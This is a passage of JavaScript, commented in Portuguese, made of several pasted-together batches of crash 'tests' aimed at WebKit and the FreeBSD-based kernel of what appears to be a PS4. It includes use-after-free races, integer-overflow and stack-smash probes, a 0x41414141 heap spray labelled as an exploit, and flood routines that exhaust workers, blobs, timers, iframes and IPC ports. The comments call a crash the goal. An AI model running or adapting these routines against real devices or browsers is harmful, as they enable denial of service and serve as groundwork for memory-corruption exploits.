            } catch(e) {
                // DataCloneError é a defesa. Crash é o sucesso.
                log("Erro Serializer: " + e.message);
            }
        }

        // --- TESTE 3: CSS calc(em) Unit Cycle ---
        // Cria dependência circular de unidades CSS.
        function runCSSUnitCycle() {
            log("[WebKit] Aplicando CSS Unit Cycle...");
            
            const el = document.createElement('div');
            document.getElementById('sandbox').appendChild(el);
            
            // 'em' é baseado no font-size atual.
            // Se definirmos font-size baseado em 'em', criamos um ciclo.
            // calc() força o cálculo matemático.
            const style = "font-size: calc(1.5em + 10px);";
            
            try {
                // Aplica a milhares de elementos para estressar o StyleResolver
                let html = "";
                for(let i=0; i<2000; i++) {
                    html += `<div style="${style}">Cycle</div>`;
                }
                el.innerHTML = html;
                
                log("Forçando Layout...");
                const h = el.offsetHeight;
                
                log("Layout Engine sobreviveu.");
                
            } catch(e) {
                log("Erro Layout: " + e.message);
            }
            
            document.getElementById('sandbox').innerHTML = "";
        }

        // --- TESTE 4: Console Log Mutex Flood (Kernel) ---
        // Spama o log do sistema de múltiplas threads.
        function runConsoleFlood() {
            log("[KERNEL] Iniciando Console Flood...");
            
            const workerCode = `
                const huge = "A".repeat(10000); // String grande para encher buffer
                setInterval(() => {
                    // Spama console.log (System Call write)
                    console.log(huge);
                    console.warn(huge);
                    console.error(huge);
                }, 1);
            `;
            
            const blob = new Blob([workerCode], {type: "text/javascript"});
            const url = URL.createObjectURL(blob);
            
            // Lança 10 workers
            for(let i=0; i<10; i++) {
                new Worker(url);
            }
            
            log("10 Workers lançados a 100% CPU. Log system under stress.");
            log("Se o console travar ou reiniciar, é Kernel Panic.");
        }

        // --- TESTE 5: Blob Handle Exhaustion (Kernel) ---
        // Esgota handles de ficheiros virtuais.
        function runBlobHandleLeak() {
            log("[KERNEL] Iniciando Blob Handle Leak...");
            
            const blobs = [];
            const limit = 50000;
            let count = 0;
            
            const interval = setInterval(() => {
                // Cria 500 URLs por ciclo
                for(let i=0; i<500; i++) {
                    // Blob vazio é suficiente para alocar um handle
                    const b = new Blob([""]);
                    const u = URL.createObjectURL(b);
                    blobs.push(u); // Mantém referência para não ser coletado
                    count++;
                }
                
                if (count % 2000 === 0) log(`Blobs ativos: ${count}`);
                
                if (count >= limit) {
                    clearInterval(interval);
                    log("Limite atingido. Tentando operação de arquivo...");
                    
                    // Tenta uma operação que precise de handle (ex: fetch)
                    // Se falhar com erro estranho, o Kernel está esgotado.
                    fetch("/").then(()=>log("Sistema ainda responde.")).catch(e=>log("Falha no sistema: " + e));
                }
            }, 10);
        }
 function runDecoderFrag() {
            log("[WebKit] Iniciando Decoder Fragmentation...");
            
            try {
                const decoder = new TextDecoder("utf-8", {fatal: true});
                // Caractere de 4 bytes (Emoji) quebrado
                const part1 = new Uint8Array([0xF0]); 
                const part2 = new Uint8Array([0x9F]);
                const part3 = new Uint8Array([0x8E]);
                const part4 = new Uint8Array([0x89]); // ??
                
                // Enche o buffer interno com estado parcial
                // Tenta confundir o ponteiro de escrita com múltiplas chamadas stream
                for(let i=0; i<1000; i++) {
                    decoder.decode(part1, {stream: true});
                    decoder.decode(part2, {stream: true});
                }
                
                log("Estado interno saturado. Forçando flush com tipo inválido...");
                
                // O GOLPE: Envia um buffer gigante válido para forçar realocação
                // enquanto o estado interno espera o resto dos bytes.
                const bomb = new Uint8Array(1024 * 1024).fill(0x41);
                decoder.decode(bomb);
                
                log("Decoder sobreviveu.");
                
            } catch(e) {
                log("Erro Decoder: " + e.message);
            }
        }

        // --- TESTE 2: Shadow DOM Slot Recursion ---
        function runSlotRecursion() {
            log("[WebKit] Criando Shadow DOM Recursion...");
            const host = document.createElement('div');
            document.body.appendChild(host);
            const root = host.attachShadow({mode: 'open'});
            
            // Cria cadeia de slots: Slot1 -> Slot2 -> Slot3 ...
            const depth = 5000;
            let current = root;
            
            try {
                for(let i=0; i<depth; i++) {
                    const slot = document.createElement('slot');
                    // Cria um div para envolver e aumentar a complexidade da árvore de renderização
                    const div = document.createElement('div');
                    div.appendChild(slot);
                    current.appendChild(div);
                    current = slot; // Próximo nível dentro do slot anterior
                }
                
                // Injeta conteúdo no host para ser projetado através dos 5000 slots
                const content = document.createElement('div');
                content.innerText = "CRASH";
                host.appendChild(content);
                
                log("Árvore de Slots criada. Forçando Layout...");
                // Força cálculo
                const h = host.offsetHeight;
                
                log("Layout Engine sobreviveu.");
                document.body.removeChild(host);
                
            } catch(e) {
                log("Erro Slot: " + e.message);
            }
        }

        // --- TESTE 3: RegExp String Type Transition ---
        function runRegexTypeConf() {
            log("[WebKit] Iniciando RegExp Type Transition...");
            
            // String inicial (OneByte / Latin1)
            let str = "AAAAAAAAAAAAAAAAAAAA"; 
            const re = /A/g;
            
            Object.defineProperty(re, 'lastIndex', {
                get: function() { return 0; },
                set: function(v) {
                    log("Trigger! Convertendo string para UTF-16 (TwoByte)...");
                    // O GOLPE: Adiciona um caractere que força a string a virar 16-bit
                    // Se o JIT compilou código para 8-bit, vai ler errado.
                    str += "\u1234"; 
                    return v;
                }
            });

            try {
                log("Executando RegExp...");
                // Executa numa string que muda de largura de bit no meio da execução
                re.exec(str);
                log("RegExp sobreviveu.");
            } catch(e) {
                log("Erro RegExp: " + e.message);
            }
        }

        // --- TESTE 4: IPC Pipe Memory Flood (Kernel) ---
        function runPipeFlood() {
            log("[KERNEL] Iniciando IPC Pipe Flood...");
            
            const channels = [];
            // Buffer de mensagem (Payload)
            const data = new ArrayBuffer(1024 * 64); // 64KB
            
            const interval = setInterval(() => {
                // Cria 100 canais por ciclo
                for(let i=0; i<100; i++) {
                    const mc = new MessageChannel();
                    // Envia dados para a porta 2, mas NINGUÉM lê a porta 2.
                    // O Kernel é obrigado a guardar isso no buffer do pipe.
                    mc.port1.postMessage(data);
                    channels.push(mc); // Mantém vivo
                }
                
                if (channels.length % 1000 === 0) log(`Canais ativos: ${channels.length}`);
                
                if (channels.length > 50000) {
                    clearInterval(interval);
                    log("Flood pausado. Verifique instabilidade do sistema.");
                }
            }, 10);
        }

        // --- TESTE 5: Pthread Creation/Destruction Storm (Kernel) ---
        function runThreadStorm() {
            log("[KERNEL] Iniciando Pthread Storm...");
            
            const workerCode = "self.close();"; // Morre imediatamente
            const blob = new Blob([workerCode], {type: "text/javascript"});
            const url = URL.createObjectURL(blob);
            
            let count = 0;
            
            // Loop agressivo de criação e destruição
            const interval = setInterval(() => {
                for(let i=0; i<20; i++) {
                    const w = new Worker(url);
                    // Não esperamos nada, apenas criamos para forçar o scheduler
                    // O worker se fecha sozinho (self.close), gerando churn na lista de threads
                    count++;
                }
                
                if (count % 500 === 0) log(`Threads cicladas: ${count}`);
                
                if (count > 10000) {
                    clearInterval(interval);
                    log("Tempestade finalizada.");
                }
            }, 10);
        }
// --- TESTE 1: OfflineAudioContext Rendering UAF ---
        // Destrói referências durante a renderização offline.
        function runAudioUAF() {
            log("[WebKit] Iniciando Offline Audio Race...");
            
            try {
                // Contexto offline (processamento rápido)
                const ctx = new OfflineAudioContext(2, 44100 * 5, 44100);
                
                // Cria grafo complexo
                let osc = ctx.createOscillator();
                let gain = ctx.createGain();
                osc.connect(gain);
                gain.connect(ctx.destination);
                osc.start(0);
                
                // Inicia renderização
                const p = ctx.startRendering();
                
                // O GOLPE: Suspende e manipula o grafo violentamente
                // Tenta confundir o thread de renderização
                setTimeout(() => {
                    try {
                        ctx.suspend(0.1).then(() => {
                            log("Suspenso. Destruindo nós...");
                            osc.disconnect();
                            gain.disconnect();
                            osc = null; // Remove referências JS
                            gain = null;
                            
                            // Resume e espera que o C++ tente acessar os nós mortos
                            ctx.resume();
                        });
                    } catch(e) {}
                }, 50); // Timing curto

                p.then(() => log("Renderização concluída (Seguro)."))
                 .catch(e => log("Erro Audio: " + e.message));
                
            } catch(e) { log("Erro Setup: " + e.message); }
        }

        // --- TESTE 2: ReadableStream Tee Race ---
        // Cancela ramos de stream enquanto escreve.
        function runStreamTeeCrash() {
            log("[WebKit] Iniciando Stream Tee Race...");
            
            let controller;
            const stream = new ReadableStream({
                start(c) { controller = c; }
            });
            
            // Bifurca o stream
            const [branch1, branch2] = stream.tee();
            const reader1 = branch1.getReader();
            const reader2 = branch2.getReader();
            
            // O GOLPE: Enfileira dados e cancela um ramo simultaneamente
            const interval = setInterval(() => {
                try {
                    controller.enqueue("DATA"); // Envia para ambos
                    
                    // Tenta cancelar o ramo 1 enquanto o 2 lê
                    reader1.cancel("race");
                    
                    // Se o estado interno de bloqueio (lock) dessincronizar -> Crash
                    reader2.read();
                    
                } catch(e) {
                    clearInterval(interval);
                    log("Teste Stream finalizado (Erro capturado: " + e.message + ")");
                }
            }, 10);
        }

        // --- TESTE 3: DocumentFragment Walker Chaos ---
        // Move nós debaixo dos pés do TreeWalker.
        function runFragmentWalker() {
            log("[WebKit] Iniciando Fragment Walker Chaos...");
            
            const frag = document.createDocumentFragment();
            const d1 = document.createElement('div');
            const d2 = document.createElement('div');
            const d3 = document.createElement('div');
            frag.appendChild(d1);
            d1.appendChild(d2);
            d2.appendChild(d3);
            
            const walker = document.createTreeWalker(frag, NodeFilter.SHOW_ELEMENT);
            
            // Posiciona no meio
            walker.nextNode(); // d1
            walker.nextNode(); // d2
            
            log("Walker posicionado. Movendo nós...");
            
            // O GOLPE: Move o nó atual (d2) para o documento principal
            // O fragmento perde o nó, mas o walker está lá.
            document.body.appendChild(d2);
            
            // Tenta navegar a partir de um contexto quebrado
            try {
                const next = walker.nextNode(); // Deveria ir para d3 ou crashar?
                log("Walker sobreviveu. Next: " + next);
                document.body.removeChild(d2);
            } catch(e) {
                log("Erro Walker: " + e.message);
            }
        }

        // --- TESTE 4: Kernel VM Map Exhaustion (Kernel) ---
        // Tenta esgotar as entradas de mapa de memória do processo.
        function runVMMaps() {
            log("[KERNEL] Iniciando VM Map Exhaustion...");
            log("Criando 500.000 ArrayBuffers independentes...");
            
            const buffers = [];
            // O Kernel do FreeBSD tem limites como 'vm.max_map_entries'
            const limit = 500000;
            
            const interval = setInterval(() => {
                try {
                    // Cria 5000 buffers por ciclo
                    // Cada um requer uma entrada de mapa separada se não for GC'd
                    for(let i=0; i<5000; i++) {
                        // Buffer pequeno (4KB = 1 página)
                        buffers.push(new ArrayBuffer(4096));
                    }
                    
                    log(`Buffers alocados: ${buffers.length}`);
                    
                    if (buffers.length >= limit) {
                        clearInterval(interval);
                        log("Limite atingido. Verifique instabilidade.");
                    }
                } catch(e) {
                    log("Erro de Alocação (Sucesso parcial): " + e.message);
                    clearInterval(interval);
                }
            }, 50);
        }

        // --- TESTE 5: Socket mbuf Deadlock (Kernel) ---
        // Tenta esgotar a memória de rede do Kernel enviando sem parar.
        function runMbufFlood() {
            log("[KERNEL] Iniciando mbuf Flood...");
            
            // Cria um payload grande
            const payload = new Uint8Array(1024 * 1024).fill(0x41); // 1MB
            const ws = new WebSocket("wss://echo.websocket.org"); // Ou loopback se possível
            
            ws.onopen = () => {
                log("Conectado. Iniciando envio contínuo...");
                
                // Envia em loop infinito sem esperar 'bufferedAmount' baixar
                const interval = setInterval(() => {
                    // Se o kernel não bloquear, enchemos a memória de saída
                    if (ws.bufferedAmount < 20 * 1024 * 1024) { // Tenta manter 20MB pendentes
                        ws.send(payload);
                    } else {
                        // Se o buffer está cheio, o Kernel está segurando a memória
                        log("Buffer cheio (" + (ws.bufferedAmount/1024/1024).toFixed(2) + "MB). Kernel stress...");
                    }
                }, 10);
            };
            
            ws.onerror = (e) => log("Erro WS: " + e);
            
            // Nota: Como não controlamos o servidor, isso depende do TCP flow control do Kernel.
            // Se o Kernel alocar buffers agressivamente, pode dar OOM.
        }
function runSplitTextUAF() {
            log("[WebKit] Iniciando splitText UAF...");
            const sandbox = document.getElementById('sandbox');
            sandbox.innerHTML = "";
            
            const div = document.createElement('div');
            const text = document.createTextNode("AAAA".repeat(1000));
            div.appendChild(text);
            sandbox.appendChild(div);

            // O GOLPE: Escuta mudanças nos dados (que splitText causa)
            text.addEventListener('DOMCharacterDataModified', function() {
                log("Mutação detectada! Removendo nó de texto...");
                try {
                    // Remove o nó da árvore enquanto o C++ ainda trabalha nele
                    div.removeChild(text);
                    
                    // Tenta forçar GC / Reutilização
                    const junk = new Array(5000).fill(1.1);
                    
                    // Acessa propriedade para ver se crasha
                    const len = text.length;
                } catch(e) {}
            });

            try {
                log("Executando splitText...");
                // Divide no meio. Isso dispara o evento acima.
                text.splitText(2000);
                log("Operação concluída (Seguro).");
            } catch(e) {
                log("Erro DOM: " + e.message);
            }
        }

        // --- TESTE 2: OffscreenCanvas Transfer Race ---
        // Transfere canvas e tenta desenhar simultaneamente.
        function runOffscreenRace() {
            log("[WebKit] Iniciando Offscreen Race...");
            
            if (!window.OffscreenCanvas) {
                log("OffscreenCanvas não suportado.");
                return;
            }

            const canvas = document.createElement('canvas');
            canvas.width = 100;
            canvas.height = 100;
            
            try {
                const offscreen = canvas.transferControlToOffscreen();
                const w = new Worker(URL.createObjectURL(new Blob([""], {type: "text/javascript"})));
                
                log("Transferindo controle...");
                w.postMessage(offscreen, [offscreen]);
                
                // O GOLPE: Acessa o canvas original IMEDIATAMENTE após transferência
                // Em teoria, ele está 'detached', mas se houver delay na atualização de estado...
                try {
                    canvas.width = 200; // Resize em canvas transferido?
                    const ctx = canvas.getContext('2d'); // Tenta obter contexto proibido
                    if (ctx) ctx.fillRect(0,0,50,50);
                } catch(e) {
                    // Erro esperado: "Cannot resize..."
                }
                
                // Mata o worker violentamente
                w.terminate();
                log("Race finalizada.");

            } catch(e) {
                log("Erro Canvas: " + e.message);
            }
        }

        // --- TESTE 3: SVG feConvolveMatrix Overflow ---
        // Cria filtro com matriz de kernel gigantesca.
        function runConvolveOverflow() {
            log("[WebKit] Criando Matrix Overflow...");
            const sandbox = document.getElementById('sandbox');
            sandbox.innerHTML = "";

            const svgNS = "http://www.w3.org/2000/svg";
            const svg = document.createElementNS(svgNS, "svg");
            const filter = document.createElementNS(svgNS, "filter");
            filter.id = "bomb";
            
            const conv = document.createElementNS(svgNS, "feConvolveMatrix");
            
            // O GOLPE: Ordem 1000x1000 = 1 Milhão de floats
            // Tenta forçar alocação massiva ou overflow de cálculo
            const size = 1000;
            conv.setAttribute("order", `${size} ${size}`);
            
            // A matriz kernelMatrix deve ter size*size números.
            // Se fornecermos menos, o parser pode ler lixo ou crashar.
            conv.setAttribute("kernelMatrix", "1 1 1"); 
            
            filter.appendChild(conv);
            svg.appendChild(filter);
            
            const rect = document.createElementNS(svgNS, "rect");
            rect.setAttribute("filter", "url(#bomb)");
            rect.setAttribute("width", "100");
            rect.setAttribute("height", "100");
            
            svg.appendChild(rect);
            sandbox.appendChild(svg);
            
            log("Filtro injetado. Forçando render...");
            // Força layout
            setTimeout(() => {
                const box = rect.getBBox();
                log("SVG Renderizado (Seguro).");
                sandbox.innerHTML = "";
            }, 200);
        }

        // --- TESTE 4: SharedWorker Process Flood (Kernel) ---
        // Spama criação de SharedWorkers.
        function runSharedWorkerFlood() {
            log("[KERNEL] Iniciando SharedWorker Flood...");
            
            if (!window.SharedWorker) {
                log("SharedWorker não suportado.");
                return;
            }
            
            const workers = [];
            let count = 0;
            
            const interval = setInterval(() => {
                for(let i=0; i<10; i++) {
                    try {
                        // Nomes únicos criam novas instâncias/processos
                        const sw = new SharedWorker("data:text/javascript,onconnect=function(e){}", "worker_" + count);
                        workers.push(sw);
                        count++;
                    } catch(e) {
                        clearInterval(interval);
                        log("Limite atingido: " + e.message);
                        return;
                    }
                }
                
                if (count % 100 === 0) log(`SharedWorkers: ${count}`);
                
                if (count > 5000) {
                    clearInterval(interval);
                    log("Teste pausado.");
                }
            }, 10);
        }

        // --- TESTE 5: setInterval Callout Exhaustion (Kernel) ---
        // Cria milhares de timers.
        function runTimerFlood() {
            log("[KERNEL] Iniciando Timer Flood...");
            
            const timers = [];
            let count = 0;
            
            const interval = setInterval(() => {
                // Cria 1000 timers por ciclo
                for(let i=0; i<1000; i++) {
                    // Timer vazio, apenas para ocupar slot no Kernel
                    const id = setInterval(() => {}, 1000000);
                    timers.push(id);
                    count++;
                }
                
                if (count % 10000 === 0) log(`Timers ativos: ${count}`);
                
                if (count > 200000) {
                    clearInterval(interval);
                    log("Flood finalizado. Verifique responsividade.");
                }
            }, 10);
        }
 function runCanvasRecursion() {
            log("[WebKit] Iniciando Canvas Recursion...");
            const canvas = document.getElementById('c');
            const ctx = canvas.getContext('2d');
            
            // Pinta algo
            ctx.fillStyle = "red";
            ctx.fillRect(0,0,100,100);
            
            try {
                // Cria padrão DO PRÓPRIO canvas
                const p = ctx.createPattern(canvas, 'repeat');
                
                // Define o padrão COMO FILL do próprio canvas
                ctx.fillStyle = p;
                
                log("Desenhando padrão recursivo...");
                // O GOLPE: Tenta ler e escrever no mesmo buffer simultaneamente
                ctx.fillRect(0,0,100,100);
                
                log("Canvas sobreviveu.");
            } catch(e) {
                log("Erro Canvas: " + e.message);
            }
        }

        // --- TESTE 2: Pointer Capture UAF ---
        function runPointerUAF() {
            log("[WebKit] Iniciando Pointer UAF...");
            const el = document.getElementById('sandbox');
            
            // Simula evento de ponteiro
            try {
                el.setPointerCapture(1); // ID arbitrário
                
                // O GOLPE: Remove o elemento capturado
                document.body.removeChild(el);
                
                // Dispara evento para o elemento "fantasma"
                const evt = new PointerEvent('pointermove', { pointerId: 1, bubbles: true });
                document.dispatchEvent(evt);
                
                log("Pointer Event despachado (Seguro).");
                
                // Restaura
                document.body.appendChild(el);
            } catch(e) {
                log("Erro Pointer: " + e.message);
                if (!document.body.contains(el)) document.body.appendChild(el);
            }
        }

        // --- TESTE 3: Font Handle Exhaustion ---
        function runFontExhaustion() {
            log("[WebKit] Criando Font Handle Flood...");
            const style = document.createElement('style');
            document.head.appendChild(style);
            
            let css = "";
            // Cria 5000 regras de fonte
            for(let i=0; i<5000; i++) {
                css += `@font-face { font-family: 'F${i}'; src: local('Arial'); } .use${i} { font-family: 'F${i}'; } `;
            }
            
            log("Injetando CSS massivo...");
            style.textContent = css;
            
            // Força o sistema a resolver os handles
            const div = document.createElement('div');
            div.className = "use4999";
            div.innerText = "TEXT";
            document.body.appendChild(div);
            
            const w = div.offsetWidth; // Força layout
            log("Fontes carregadas.");
            
            setTimeout(() => {
                document.head.removeChild(style);
                document.body.removeChild(div);
            }, 2000);
        }

        // --- TESTE 4: Kernel VM Map Fragmentation ---
        function runVMFragmentation() {
            log("[KERNEL] Fragmentando VM Map...");
            
            const chunks = [];
            // Tenta alocar e fragmentar memória
            const interval = setInterval(() => {
                try {
                    // Aloca 100 buffers
                    for(let i=0; i<100; i++) {
                        const b = new ArrayBuffer(1024 * 64); // 64KB
                        chunks.push(b);
                    }
                    
                    // Liberta (remove referência) de cada segundo buffer
                    // Isso cria "buracos" no mapa de memória do kernel
                    for(let i=chunks.length-100; i<chunks.length; i+=2) {
                        chunks[i] = null;
                    }
                    
                    if (chunks.length > 100000) {
                        // Limpa metade para continuar stressando
                        chunks.splice(0, 50000);
                        log("Ciclo de fragmentação...");
                    }
                    
                } catch(e) {
                    log("Erro Alloc: " + e.message);
                }
            }, 10);
            
            setTimeout(() => { clearInterval(interval); log("Fragmentação parada."); }, 10000);
        }

        // --- TESTE 5: Worker Stack Clash ---
        function runStackClash() {
            log("[KERNEL] Iniciando Stack Clash...");
            
            const workerCode = `
                function recursion(d) {
                    const v = new Float64Array(100); // Ocupa stack frame
                    if (d > 0) recursion(d-1);
                }
                onmessage = () => {
                    try { recursion(10000); } catch(e) {}
                    postMessage("Done");
                }
            `;
            
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            for(let i=0; i<20; i++) {
                const w = new Worker(url);
                w.postMessage("go");
            }
            log("Workers recursivos lançados.");
        }
function runTransferSpray() {
            log("[WebKit] Iniciando Transfer Spray...");
            const channel = new MessageChannel();
            const port = channel.port1;
            const trash = [];
            
            try {
                // Aloca buffers pequenos e transfere repetidamente
                const interval = setInterval(() => {
                    for(let i=0; i<1000; i++) {
                        const buf = new ArrayBuffer(128); // Pequeno para criar muitas entradas
                        // Transfere o buffer (neutering). O WebKit tem de gerir a "casca" vazia.
                        port.postMessage(buf, [buf]);
                        trash.push(buf); // Mantém referência JS para o objeto vazio
                    }
                    
                    if (trash.length % 50000 === 0) log(`Transferidos: ${trash.length}`);
                    
                    if (trash.length > 1000000) {
                        clearInterval(interval);
                        log("Spray finalizado. Verifique estabilidade.");
                    }
                }, 10);
            } catch(e) { log("Erro: " + e.message); }
        }

        // --- TESTE 2: String.padEnd Integer Overflow ---
        function runPadEndOverflow() {
            log("[WebKit] Testando padEnd Overflow...");
            const base = "A";
            
            // Valores próximos do limite de 32-bit (2^31 - 1)
            const targets = [0x7FFFFFFF, 0x40000000, 1073741824]; 
            
            targets.forEach(len => {
                setTimeout(() => {
                    try {
                        log(`Tentando padEnd(${len})...`);
                        // Se houver overflow no cálculo (len * sizeof(char)), aloca pouco e escreve muito.
                        const s = base.padEnd(len, "B");
                        log(`String criada (Length: ${s.length})`);
                    } catch(e) {
                        // RangeError é normal. Crash é sucesso.
                    }
                }, 100);
            });
        }

        // --- TESTE 3: CSS Grid/Flex Recursion Crash ---
        function runLayoutDeep() {
            log("[WebKit] Criando Layout Recursivo...");
            const root = document.createElement('div');
            let curr = root;
            const depth = 4000; // Profundidade da árvore
            
            // Cria estrutura aninhada alternando Grid e Flex
            for(let i=0; i<depth; i++) {
                const el = document.createElement('div');
                el.style.display = (i % 2 === 0) ? "grid" : "flex";
                // Força cálculo complexo
                el.style.gridTemplateColumns = "1fr 1fr";
                curr.appendChild(el);
                curr = el;
            }
            
            document.getElementById('sandbox').appendChild(root);
            
            setTimeout(() => {
                log("Forçando Layout (Reflow)...");
                try {
                    const h = root.offsetHeight; // Gatilho
                    log("Layout calculado (Seguro).");
                } catch(e) { log("Erro Layout: " + e.message); }
                document.getElementById('sandbox').innerHTML = "";
            }, 100);
        }

        // --- TESTE 4: Kernel VM Map Fragmentation (Panic Variant) ---
        // Variação do teste que desligou seu console.
        // Em vez de só encher, fragmenta para causar falha na gestão do kernel.
        function runVMFrag() {
            log("[KERNEL] Iniciando Fragmentação de VM (Risco de Panic)...");
            
            const maps = [];
            // Tamanho de página do PS4 (16KB ou 4KB)
            const pageSize = 16384; 
            
            const interval = setInterval(() => {
                try {
                    // 1. Aloca bloco grande (2MB)
                    const buf = new ArrayBuffer(2 * 1024 * 1024);
                    maps.push(buf);
                    
                    // 2. O GOLPE: Libertação Seletiva (Simulada via GC pressure)
                    // Em JS puro não temos free() explícito, mas podemos descartar referências.
                    // Descartamos 1 a cada 2 para criar "buracos".
                    if (maps.length % 2 === 0) {
                        maps[maps.length - 2] = null; // Liberta o anterior
                    }
                    
                    // Mantém pressão
                    if (maps.length > 500000) { // Tenta atingir o limite novamente
                        log("Limpando array para forçar GC massivo...");
                        maps.length = 0; 
                        // O GC vai tentar limpar os buracos, estressando o VM map lock do Kernel
                    }
                    
                    if (maps.length % 10000 === 0) log(`Alocações ativas: ${maps.length}`);
                    
                } catch(e) {
                    log("Erro Alloc: " + e.message);
                    clearInterval(interval);
                }
            }, 5);
        }

        // --- TESTE 5: Shared Memory Handle Exhaustion ---
        function runSharedMemFlood() {
            log("[KERNEL] Iniciando Shared Memory Flood...");
            
            if (!window.BroadcastChannel) {
                log("BroadcastChannel não suportado.");
                return;
            }
            
            const channels = [];
            
            const interval = setInterval(() => {
                // Cria canais de comunicação IPC
                // Cada canal pode alocar um objeto de memória partilhada no kernel
                for(let i=0; i<100; i++) {
                    const bc = new BroadcastChannel("shm_flood_" + Math.random());
                    channels.push(bc);
                }
                
                if (channels.length % 5000 === 0) log(`Canais IPC: ${channels.length}`);
                
                if (channels.length > 100000) {
                    clearInterval(interval);
                    log("Limite atingido. Fechando...");
                    channels.forEach(c => c.close());
                }
            }, 10);
        }

function runGridExplosion() {
            log("[WebKit] Iniciando Grid Explosion...");
            const el = document.getElementById('grid-area');
            el.style.display = "grid";
            el.innerHTML = "<div>ITEM</div>";
            
            try {
                // Define um item numa posição absurda
                // O Grid deve criar "Implicit Tracks" do 0 até 500.000
                const item = el.firstElementChild;
                item.style.gridRow = "500000"; 
                item.style.gridColumn = "500000";
                
                log("Forçando Layout Grid Massivo...");
                const h = el.offsetHeight;
                
                log("Grid sobreviveu (Otimizado?).");
                el.style.display = "none";
            } catch(e) {
                log("Erro Grid: " + e.message);
            }
        }

        // --- TESTE 2: Intl.NumberFormat Stack Smash ---
        // Recursão dentro do formatador.
        function runIntlRecursion() {
            log("[WebKit] Iniciando Intl Recursion...");
            
            try {
                const fmt = new Intl.NumberFormat("en-US");
                
                const evil = {
                    valueOf: function() {
                        // Recursão: chama format novamente dentro do valueOf
                        try { fmt.format(evil); } catch(e) {}
                        return 0;
                    }
                };

                log("Formatando objeto recursivo...");
                fmt.format(evil);
                log("Intl sobreviveu.");
                
            } catch(e) {
                // Stack Overflow JS é normal. Crash nativo é o objetivo.
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 3: Array.splice Argument Stack Smash ---
        // Passa argumentos demais para a stack nativa.
        function runSpliceBlast() {
            log("[WebKit] Iniciando Splice Blast...");
            
            try {
                const arr = [];
                // 200.000 argumentos via spread
                const args = new Array(200000).fill(1);
                
                log("Executando splice com 200k argumentos...");
                // O spread (...) expande na pilha.
                arr.splice(0, 0, ...args);
                
                log("Splice sobreviveu. Length: " + arr.length);
                
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 4: Iframe Window Handle Flood (Kernel) ---
        // Spama criação de iframes para esgotar handles gráficos.
        function runIframeFlood() {
            log("[KERNEL] Iniciando Iframe Flood...");
            const container = document.getElementById('iframe-container');
            let count = 0;
            
            const interval = setInterval(() => {
                // Cria 50 iframes por ciclo
                for(let i=0; i<50; i++) {
                    const ifr = document.createElement('iframe');
                    // Carrega algo leve para não matar só por rede
                    ifr.src = "about:blank";
                    container.appendChild(ifr);
                    count++;
                }
                
                // Remove antigos para tentar manter o browser vivo, 
                // mas o Kernel pode não libertar os handles a tempo (Leak)
                if (container.childNodes.length > 1000) {
                    // Remove 500
                    for(let i=0; i<500; i++) container.removeChild(container.firstChild);
                }
                
                if (count % 500 === 0) log(`Iframes criados: ${count}`);
                
                if (count > 20000) {
                    clearInterval(interval);
                    log("Flood finalizado. Verifique a UI do console.");
                }
            }, 50);
        }

        // --- TESTE 5: MessagePort Kernel Handle Leak (Kernel) ---
        // Cria portas, envia para worker e mata o worker para vazar o handle no Kernel.
        function runPortLeak() {
            log("[KERNEL] Iniciando Port Handle Leak...");
            
            const wUrl = URL.createObjectURL(new Blob([""], {type:"text/javascript"}));
            let count = 0;
            
            const interval = setInterval(() => {
                // Lança 20 workers
                for(let i=0; i<20; i++) {
                    const w = new Worker(wUrl);
                    const mc = new MessageChannel();
                    
                    // Envia a porta para o worker (transfere ownership para o processo do worker)
                    w.postMessage("leak", [mc.port1]);
                    
                    // MATA O WORKER IMEDIATAMENTE
                    // O Kernel tem de limpar a porta que estava na fila de mensagens do worker morto.
                    // Se falhar, o handle vaza (Kernel Memory Leak).
                    w.terminate();
                    count++;
                }
                
                if (count % 1000 === 0) log(`Tentativas de Leak: ${count}`);
                
                if (count > 50000) {
                    clearInterval(interval);
                    log("Teste finalizado.");
                }
            }, 20);
        }

	const sprayContainer = [];
    function performHeapSpray() {
        log(">> Injetando Heap Spray (tentando ocupar memória liberada)...");
        try {
            // Cria blocos de 1MB com padrão repetitivo
            const sprayChunk = new Uint32Array(1024 * 256); 
            sprayChunk.fill(0x41414141); // O padrão "mágico" para exploits
            
            // Aloca 50 chunks para tentar "pegar" o lugar do Worker morto
            for(let i=0; i<50; i++) {
                sprayContainer.push(sprayChunk.slice(0)); 
            }
        } catch(e) { log("Spray limit: " + e.message); }
    }

    // --- TESTE 1: SharedWorker Race (Create/Kill Loop) ---
    // Cria workers dentro de um iframe e destrói o iframe imediatamente.
    // Objetivo: Causar confusão no Kernel sobre quem é o "dono" do processo.
    function runSharedWorkerRace() {
        log("[KERNEL] Iniciando Race Condition (Iframe Flicker)...");
        
        let count = 0;
        const maxCycles = 500; // Limite de segurança

        const interval = setInterval(() => {
            count++;
            
            // 1. Cria um conteiner descartável (Iframe)
            const ifr = document.createElement('iframe');
            document.body.appendChild(ifr);
            
            // 2. Cria um lote de SharedWorkers lá dentro
            try {
                for(let i=0; i<20; i++) {
                    // Nomes únicos para forçar novas alocações no Kernel
                    new ifr.contentWindow.SharedWorker("data:text/javascript,onconnect=function(){}", "race_" + count + "_" + i);
                }
            } catch(e) {}

            // 3. O GOLPE: Remove o iframe imediatamente (Destruição violenta)
            // Isso força o browser a matar os processos filhos instantaneamente
            document.body.removeChild(ifr);

            if (count % 10 === 0) log(`Ciclos de Race: ${count}`);

            if (count >= maxCycles) {
                clearInterval(interval);
                log("Teste Race finalizado (Sem crash imediato).");
            }
        }, 50); // 50ms = Rápido o suficiente para causar colisão
    }

    // --- TESTE 2: SharedWorker UAF + Heap Spray ---
    // Similar ao anterior, mas injeta dados na memória logo após a destruição.
    // Objetivo: Se o Kernel tentar ler o worker deletado, vai ler 0x41414141.
    function runWorkerHeapSpray() {
        log("[EXPLOIT] Iniciando UAF Hunt com Heap Spray...");
        
        let cycle = 0;
        
        const loop = setInterval(() => {
            cycle++;
            
            // 1. Aloca Workers
            const workers = [];
            for(let i=0; i<50; i++) {
                try {
                    workers.push(new SharedWorker("data:text/javascript,console.log('init')", "spray_" + cycle + "_" + i));
                } catch(e) {}
            }
            
            // 2. Tenta "matar" as referências para o GC entrar em ação
            // Como SharedWorker é difícil de matar explicitamente, usamos port.close() e limpamos o array
            for(let w of workers) {
                w.port.close();
            }
            workers.length = 0; // Remove referências JS

            // 3. Imediatamente enche a memória (Spray)
